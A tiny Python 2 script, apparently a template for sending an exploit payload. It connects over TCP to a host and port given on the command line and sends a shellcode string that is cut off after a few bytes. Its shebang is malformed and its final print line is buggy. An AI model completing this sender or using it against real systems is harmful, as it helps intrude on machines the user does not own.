!/usr/bin/python

import sys, socket

shellcode= ("\x31\xc0\x21.......")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM,0)
sock.connect((sys.argv[1], int(sys.argv[2])))
sock.send(shellcode)
sock.close()
print "Shellcode: %d sent!\n", len(shellcode)
